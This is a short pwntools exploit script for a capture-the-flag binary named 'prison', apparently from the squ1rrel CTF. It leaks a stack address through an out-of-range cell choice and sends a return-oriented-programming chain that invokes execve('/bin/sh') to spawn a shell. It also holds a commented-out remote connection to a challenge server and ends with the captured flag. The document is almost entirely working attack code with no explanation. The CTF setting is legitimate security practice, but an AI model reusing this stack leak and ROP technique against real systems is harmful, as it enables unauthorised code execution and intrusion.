from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./prison', '''
    b *(prison+310)
    continue
''')

# p = remote('20.84.72.194', 5001)

p.sendlineafter(b'They gave you the premium stay so at least you get to choose your cell (1-6): ', b'9')
p.recvuntil(b'Your cellmate is ')
leaked_stack_addr = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info(f'stack address: {hex(leaked_stack_addr)}')

chain = [
    0x401a0d, leaked_stack_addr,  # pop rdi; ret
    0x413676, 0, leaked_stack_addr-0x58,  # pop rsi; pop rbp; ret
    0x41f464, 59,  # pop rax; ret
    0x4013b8,  # syscall
]

p.recvuntil(b'What is your name: ')
p.sendline(b''.join(p64(x) for x in chain)+p64(leaked_stack_addr-0x58)+p64(0x401b54)+b'/bin/sh\x00'+p64(0))

p.interactive()

# squ1rrel{m4n_0n_th3_rUn_fr0m_NX_pr1s0n!}